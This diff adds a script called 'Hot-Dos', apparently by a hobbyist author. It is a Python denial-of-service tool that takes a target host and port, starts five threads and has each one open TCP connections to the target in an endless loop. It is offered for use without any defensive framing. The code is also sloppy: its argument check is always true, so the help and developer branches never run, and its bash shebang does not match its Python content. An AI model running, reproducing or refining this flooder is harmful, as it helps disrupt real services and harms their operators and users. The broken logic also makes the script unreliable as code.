@@ -1,0 +1,69 @@
+#!/usr/bin/env bash
+# This Programm Write by Mr.nope
+# Hot-Dos v1.4.3
+import os
+import time
+from sys import argv as hot
+import sys
+import webbrowser
+import platform
+import socket
+import threading
+try:
+    from colorama import Fore,init
+    init()
+except ImportError:
+    os.system("pip3 install colorama")
+system = platform.uname()[0]
+End = '\033[0m'
+Run_Err = "\nPlease, Run This Programm on Linux, MacOS and Windows!\n"
+hot_help = Fore.GREEN + """
+Hot Dos:
+          ./hot <Host> <Port>
+          --help
+          --dev
+"""
+def title():
+    if system == 'Linux':
+        os.system("printf '\033]2;Dos\a'")
+    elif system == 'Windows':
+        os.system("title Dos")
+    else:
+        print(Run_Err)
+        sys.exit()
+def main():
+    if hot[1] == hot[1]:
+        try:
+            title()
+            host = hot[1]
+            port = hot[2]
+            time.sleep(0.35)
+            ip = socket.gethostbyname(host)
+            print("\nUsage: Ctrl + C To Exit!!!\n")
+            def run(h):
+                while True:
+                    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                    s.connect((host,int(port)))
+                    print(f"\n{Fore.GREEN} Packet send to {Fore.RED} {ip} {End}")
+            for i in range(5):
+                t = threading.Thread(target=run, args=[i])
+                t.start()
+        except KeyboardInterrupt:
+            print("\nCtrl + C")
+            print("\nStop " + Fore.RED + "Dos !!!\n" + End)
+            sys.exit()
+    elif hot[1] == '--help':
+        print(hot_help)
+        sys.exit()
+    elif hot[1] == '--dev':
+        print("\nOpenning Developer Github...\n")
+        webbrowser.open_new("https://github.com/mrprogrammer2938")
+        sys.exit()
+    else:
+        print("{} Not Found!".format(hot[1]))
+        sys.exit()
+if __name__ == '__main__':
+    try:
+        main()
+    except IndexError:
+        print(hot_help)
